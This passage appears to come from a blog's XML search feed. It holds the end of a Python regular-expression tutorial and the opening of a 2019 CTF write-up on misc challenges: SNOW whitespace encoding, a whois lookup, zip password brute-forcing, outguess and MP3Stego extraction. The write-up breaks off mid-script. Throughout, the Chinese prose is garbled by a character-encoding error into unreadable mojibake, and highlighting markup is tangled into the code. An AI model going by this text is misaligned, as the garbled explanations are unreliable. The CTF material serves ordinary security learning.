class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">34</span>), match='The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.'&gt;</span><br><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br><span class="line">(<span class="number">0</span>, <span class="number">34</span>)</span><br></pre></td></tr></table></figure><h4 id="4-è´ªå©ªä¸éè´ªå©ª"><a href="#4-è´ªå©ªä¸éè´ªå©ª" class="headerlink" title="4.è´ªå©ªä¸éè´ªå©ª"></a>4.è´ªå©ªä¸éè´ªå©ª</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(<span class="string">'è´ªå©ªåŒ¹é…:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*(\d+).*'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>)) <span class="comment">#è¾“å‡ºç¬¬ä¸€ä¸ªè¢«()åŒ…è£¹çš„å†…å®¹</span></span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'éè´ªå©ªåŒ¹é…:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*'</span>, content) </span><br><span class="line">print(result.group())</span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>))</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*?'</span>, content)</span><br><span class="line">print(result.group())</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è´ªå©ªåŒ¹é…:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 6</span><br><span class="line">--------------------</span><br><span class="line">éè´ªå©ªåŒ¹é…:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 123456</span><br><span class="line">--------------------</span><br><span class="line">The 123456</span><br></pre></td></tr></table></figure><h4 id="5-ä¿®é¥°ç¬¦-re-S"><a href="#5-ä¿®é¥°ç¬¦-re-S" class="headerlink" title="5.ä¿®é¥°ç¬¦ re.S"></a>5.ä¿®é¥°ç¬¦ re.S</h4><p>ç”±äºåŠ ä¸Šre.Så‚æ•°å, é€šé…ç¬¦ . å°†å¯ä»¥åŒ¹é…æ¢è¡Œç¬¦, æ‰€ä»¥resultä¸ä¸ºç©º, result2ä¸ºç©ºã€‚é™¤äº†re.S, è¿˜æœ‰è®¸å¤šä¿®é¥°ç¬¦å¦‚, </p><p>re.I: ä½¿ç”¨åŒ¹é…æ—¶å¿½ç•¥å¤§å°å†™ã€‚ï¼ˆå¤§å†™çš„iï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''The 123456 is</span></span><br><span class="line"><span class="string">one of my phone.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">result = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content, re.S)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    print(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result = None'</span>)</span><br><span class="line">result2 = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">result2 = None</span><br></pre></td></tr></table></figure><h4 id="6-è½¬ä¹‰åŒ¹é…"><a href="#6-è½¬ä¹‰åŒ¹é…" class="headerlink" title="6.è½¬ä¹‰åŒ¹é…"></a>6.è½¬ä¹‰åŒ¹é…</h4><p>ç”±äº()å±äºæ­£åˆ™è¡¨è¾¾å¼çš„ç‰¹æ®Šå­—ç¬¦, å› æ­¤åœ¨éœ€è¦åŒ¹é…()æ—¶, éœ€è¦åŠ ä¸Šè½¬ä¹‰å­—ç¬¦â€™â€™.</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'(ç™¾åº¦)www.baidu.com'</span></span><br><span class="line">result = re.<span class="keyword">match</span>(<span class="string">'(ç™¾åº¦)www.baidu.com'</span>, content)</span><br><span class="line">result2 = re.<span class="keyword">match</span>(<span class="string">'\(ç™¾åº¦\)www\.baidu\.com'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="keyword">print</span>(result.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result = None'</span>)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    <span class="keyword">print</span>(result2.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = None</span><br><span class="line">(ç™¾åº¦)www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure><h4 id="7-search-æ–¹æ³•-ä¸match-æ–¹æ³•ä¸åŒ-ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…"><a href="#7-search-æ–¹æ³•-ä¸match-æ–¹æ³•ä¸åŒ-ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…" class="headerlink" title="7.search()æ–¹æ³•, ä¸match()æ–¹æ³•ä¸åŒ, ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…"></a>7.search()æ–¹æ³•, ä¸match()æ–¹æ³•ä¸åŒ, ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'Other The 123456 is my one phone number.'</span></span><br><span class="line">result = re.search(<span class="string">'The.*?(\d+).*?number.'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result.group()</span></span>)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br></pre></td></tr></table></figure><h4 id="8-findall-æ–¹æ³•"><a href="#8-findall-æ–¹æ³•" class="headerlink" title="8.findall()æ–¹æ³•"></a>8.findall()æ–¹æ³•</h4><p>match()å’Œsearch()éƒ½æ˜¯è¿”å›åŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ªå†…å®¹å°±ç»“æŸåŒ¹é…, findall()æ˜¯è¿”å›æ‰€æœ‰ç¬¦åˆåŒ¹é…è§„åˆ™çš„å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"songs-list"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>æ­Œå•<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"introduction"</span>&gt;</span>æ­Œå•åˆ—è¡¨<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"list"</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"2"</span>&gt;</span>ä¸€è·¯ä¸Šæœ‰ä½ <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/2.mp3"</span> <span class="attr">singer</span>=<span class="string">"ä»»è´¤é½"</span>&gt;</span>æ²§æµ·ä¸€å£°ç¬‘<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"4"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/3.mp3"</span> <span class="attr">singer</span>=<span class="string">"é½ç§¦"</span>&gt;</span>å¾€äº‹éšé£<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"6"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/4.mp3"</span> <span class="attr">singer</span>=<span class="string">"beyond"</span>&gt;</span>å…‰è¾‰å²æœˆ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/5.mp3"</span> <span class="attr">singer</span>=<span class="string">"ç¨‹æ…§ç²"</span>&gt;</span>è®°äº‹æœ¬<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-veiw</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/6.mp3"</span> <span class="attr">singer</span>=<span class="string">"é‚“ä¸½å›"</span>&gt;</span>ä½†æ„¿äººé•¿ä¹…<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line">result = re.findall('<span class="tag">&lt;<span class="name">li.*?href="(.*?)".*?singer="(.*?)"</span>&gt;</span>(.*?)<span class="tag">&lt;/<span class="name">a</span>&gt;</span>', html, re.S)</span><br><span class="line">if result:</span><br><span class="line">    print(result)</span><br><span class="line">    for res in result:</span><br><span class="line">        print(res[0], res[1], res[2])</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">'/2.mp3'</span>, <span class="string">'ä»»è´¤é½'</span>, <span class="string">'æ²§æµ·ä¸€å£°ç¬‘'</span>), (<span class="string">'/3.mp3'</span>, <span class="string">'é½ç§¦'</span>, <span class="string">'å¾€äº‹éšé£'</span>), (<span class="string">'/4.mp3'</span>, <span class="string">'beyond'</span>, <span class="string">'å…‰è¾‰å²æœˆ'</span>), (<span class="string">'/5.mp3'</span>, <span class="string">'ç¨‹æ…§ç²'</span>, <span class="string">'è®°äº‹æœ¬'</span>), (<span class="string">'/6.mp3'</span>, <span class="string">'é‚“ä¸½å›'</span>, <span class="string">'ä½†æ„¿äººé•¿ä¹…'</span>)]</span><br><span class="line">/<span class="number">2</span><span class="selector-class">.mp3</span> ä»»è´¤é½ æ²§æµ·ä¸€å£°ç¬‘</span><br><span class="line">/<span class="number">3</span><span class="selector-class">.mp3</span> é½ç§¦ å¾€äº‹éšé£</span><br><span class="line">/<span class="number">4</span><span class="selector-class">.mp3</span> beyond å…‰è¾‰å²æœˆ</span><br><span class="line">/<span class="number">5</span><span class="selector-class">.mp3</span> ç¨‹æ…§ç² è®°äº‹æœ¬</span><br><span class="line">/<span class="number">6</span><span class="selector-class">.mp3</span> é‚“ä¸½å› ä½†æ„¿äººé•¿ä¹…</span><br></pre></td></tr></table></figure><h4 id="9-sub-æ–¹æ³•-å»é™¤åŒ¹é…çš„å­—ç¬¦"><a href="#9-sub-æ–¹æ³•-å»é™¤åŒ¹é…çš„å­—ç¬¦" class="headerlink" title="9.sub()æ–¹æ³•, å»é™¤åŒ¹é…çš„å­—ç¬¦"></a>9.sub()æ–¹æ³•, å»é™¤åŒ¹é…çš„å­—ç¬¦</h4><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸¤ä¸ªâ€™ï¼Œè¡¨ç¤ºå§â€™\d+â€˜ åŒ¹é…çš„å†…å®¹æ›¿æ¢æˆç©ºï¼Œå¦‚æœå†™sub(â€™\d+â€™, â€˜?â€™), åˆ™æŠŠåŒ¹é…çš„å†…å®¹æ›¿æ¢æˆ ?ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'54abc59de335f7778888g'</span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">''</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br><span class="line">??abc??<span class="keyword">de</span>???f???????<span class="keyword">g</span></span><br><span class="line">?abc?<span class="keyword">de</span>?f?<span class="keyword">g</span></span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹åƒreplaceï¼Œä½†æ˜¯å¤šä¸€ä¸ªæ­£åˆ™å…³ç³»åŒ¹é…</p><h4 id="10-compile"><a href="#10-compile" class="headerlink" title="10.compile()"></a>10.compile()</h4><p>åœ¨éœ€è¦åŒ¹é…ç›¸åŒæ­£åˆ™è¡¨è¾¾å¼æƒ…å†µä¸‹, äº‹å…ˆå®šä¹‰ä¸€ä¸ªcompileå¯ä»¥ç®€åŒ–ä»£ç é‡, åŒæ—¶compileä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ä¿®é¥°ç¬¦re.Sç­‰.</p><p>( å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥a=ruleï¼Œç„¶å result = re.findall(a,string) ,ä½†æ˜¯è¿™æ ·å­å°±ä¸èƒ½ç”¨ä¿®é¥°ç¬¦re.Säº†)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content1 = '2016-1-1 12:01'</span><br><span class="line">content2 = '2017-1-1 12:02'</span><br><span class="line">content3 = '2018-1-1 12:03'</span><br><span class="line"></span><br><span class="line">pattern = re.compile('\d&#123;2&#125;:\d&#123;2&#125;')</span><br><span class="line">result1 = re.sub(pattern, '', content1)</span><br><span class="line">result2 = re.sub(pattern, '', content2)</span><br><span class="line">result3 = re.sub(pattern, '', content3)</span><br><span class="line">print(result1, result2, result3)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2016</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2017</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2018</span><span class="number">-1</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><p>é™„ä¸€æ‰‹å»é™¤åˆ—è¡¨ç©ºå…ƒç´ çš„æ–¹æ³•ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mytest = [<span class="selector-tag">i</span> <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> test <span class="keyword">if</span> <span class="selector-tag">i</span> != <span class="string">''</span>]</span><br></pre></td></tr></table></figure><h3 id="ç•ªå¤–"><a href="#ç•ªå¤–" class="headerlink" title="ç•ªå¤–"></a>ç•ªå¤–</h3><p>è¿™é‡Œè®°ä¸€ä¸‹ä»ä»Li4n0å­¦é•¿è„šæœ¬ä¸­å‘ç°çš„å­—ç¬¦è¡¨æ›¿æ¢å‡½æ•°ï¼š<strong>maketrans()</strong></p><p>è¯­æ³•ï¼šstr.maketrans(intab, outtab)</p><p>å‚æ•°ï¼š</p><p>intab â€“ å­—ç¬¦ä¸²ä¸­è¦æ›¿ä»£çš„å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²</p><p>outtab â€“ ç›¸åº”çš„æ˜ å°„å­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚</p><p>é…åˆstr.translateä½¿ç”¨</p><p>å®ä¾‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intab = <span class="string">"aeiou"</span></span><br><span class="line">outtab = <span class="string">"4310U"</span></span><br><span class="line">transtab = str.maketrans(intab, outtab)</span><br><span class="line"></span><br><span class="line">content = <span class="string">"this is string example....wow!!!"</span></span><br><span class="line">print (content.translate(transtab))</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th1s <span class="number">1</span>s str1ng <span class="number">3</span>x4mpl3....w0w!!!</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://blog.csdn.net/qq_38038143/article/details/80671420" target="_blank" rel="noopener">https://blog.csdn.net/qq_38038143/article/details/80671420</a></p><p><a href="https://www.cnblogs.com/zjltt/p/6955965.html" target="_blank" rel="noopener">https://www.cnblogs.com/zjltt/p/6955965.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 èµ›åšæ¯</title>
      <link href="/2019/07/14/2019%E8%B5%9B%E5%8D%9A%E6%9D%AF/"/>
      <url>/2019/07/14/2019%E8%B5%9B%E5%8D%9A%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://xz.aliyun.com/t/5648" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113451-02002070-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113451-02002070-a456-1.png" alt="img"></a></p><p>æ‰«æ¡å½¢ç å¾—åˆ°flagã€‚</p><h3 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h3><p>snowåŠ å¯†ï¼Œå°†æ–‡ä»¶æ”¾å…¥010editorçœ‹ä»–çš„åå…­è¿›åˆ¶å½¢å¼ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113508-0be31fb6-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113508-0be31fb6-a456-1.png" alt="img"></a></p><p>0D0Aæ˜¯æ¢è¡Œï¼Œå‰©ä¸‹çš„å°†20è½¬0ï¼Œå°†09è½¬1ï¼Œå¾—åˆ°çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å³å¯å¾—åˆ°flagã€‚</p><h3 id="åŸºç¡€ç¤¾å·¥"><a href="#åŸºç¡€ç¤¾å·¥" class="headerlink" title="åŸºç¡€ç¤¾å·¥"></a>åŸºç¡€ç¤¾å·¥</h3><p>é¢˜ç›®ä»‹ç»ï¼šå¤§å®¶éƒ½ç”¨ç€æˆ‘ä»¬çš„æ•°å­—æ­ç”µï¼ˆi.hdu.edu.cn)ä½†æ˜¯å¯¹äºå…¶æ³¨å†Œè€…å´å•¥ä¹Ÿä¸çŸ¥é“ï¼Œæ‰€ä»¥å°yæ‰“ç®—å»çœ‹çœ‹æ³¨å†Œæ•°å­—æ­ç”µçš„åˆ›å§‹äººçš„é‚®ç®±<br>flagå½¢å¼ä¸ºï¼šflag{ä½ æ‰¾åˆ°çš„ç”µå­é‚®ç®±}</p><p>ç™¾åº¦ä¸€ä¸ªIPåæŸ¥è¯¢å·¥å…·ï¼ŒWhoisæŸ¥è¯¢ï¼Œçœ‹çœ‹è¿™ä¸ªIPçš„å¤‡æ¡ˆï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113523-14d1e74c-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113523-14d1e74c-a456-1.png" alt="img"></a></p><p>å¾—åˆ°flagï¼›</p><h3 id="The-world"><a href="#The-world" class="headerlink" title="The world"></a>The world</h3><p>ä¸‹è½½å¾—åˆ°ä¸€å¼ å›¾ï¼ŒçŒœæµ‹æ˜¯éšå†™ï¼Œç›´æ¥foremoståˆ†è§£ï¼Œå¾—åˆ°å››å¼ å›¾ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113536-1c731c6e-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113536-1c731c6e-a456-1.png" alt="img"></a></p><p>ç¬¬ä¸€å¼ æ˜¯å¯è§çš„ï¼Œåº”è¯¥æ²¡ç”¨ï¼Œå‰©ä¸‹æ¥çš„ï¼ŒæŒ‰é¡ºåºçœ‹ã€‚<br>ç¬¬ä¸€ä»½å‹ç¼©åŒ…æ˜¯åŠ å¯†å‹ç¼©åŒ…ï¼Œçœ‹äº†ä¸€ä¸‹ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œäºæ˜¯æ”¾å…¥å·¥å…·è¿›è¡Œç®€å•çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç abc123ï¼Œå¾—åˆ°æ–‡ä»¶ï¼š<br>d2abd3fb9d4c93fb064abf81f5fab84<br>æ–°æ‰‹æ‘é’¥åŒ™<br>ç¬¬äºŒä»½æ–‡ä»¶æ˜¯ä¸€å¼ å›¾ï¼ŒçŒœæµ‹æ˜¯LSBéšå†™ï¼Œå¯†ç ä¸ºä¸Šè¿°å­—ç¬¦ä¸²ï¼Œæµ‹è¯•åå‘ç°ä¸æ˜¯ã€‚ç»§ç»­è€ƒè™‘ï¼Œå¯èƒ½æ˜¯outguessåŠ å¯†ï¼Œ<br>outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84<br>å¾—åˆ°æ–‡ä»¶<br>95cca6c50e48e86c468ee329ddc11047</p><p>æœ€åä¸€å…³å¤§é—¨çš„é’¥åŒ™<br>ç¬¬ä¸‰ä»½æ–‡ä»¶æ˜¯ä¸€ä¸ªmp3æ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯MP3éšå†™ï¼Œç”¨MP3Stegoè§£å¯†ï¼Œå³å¯å¾—åˆ°flag</p><h3 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h3><p>hintï¼šPILæ˜¯ä¸ªå¥½ä¸œè¥¿<br>ä¸‹è½½å¾—åˆ°ä¸¤ä»½ä¸€æ ·çš„æ–‡ä»¶ï¼Œè¯•äº†è¯•ç›²æ°´å°ï¼Œå‘ç°æ²¡æœ‰ç”¨ã€‚ä½¿ç”¨Beyond Compare 4ç»“åˆåå‘ç°<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113558-297f7c0e-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113558-297f7c0e-a456-1.png" alt="img"></a><br>å­—ç¬¦è¿™é‡Œæœ‰ç‚¹ä¸œè¥¿ã€‚æ ¹æ®é¢˜ç›®æç¤ºï¼ŒçŒœæµ‹è¦å°†ä¸¤å¼ å›¾ç‰‡çš„æ‰€æœ‰å…ƒç´ ç‚¹çš„ç°åº¦æ‹¿æ¥ä½œæ¯”è¾ƒï¼Œ<br>æ„é€ è„šæœ¬å¦‚ä¸‹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 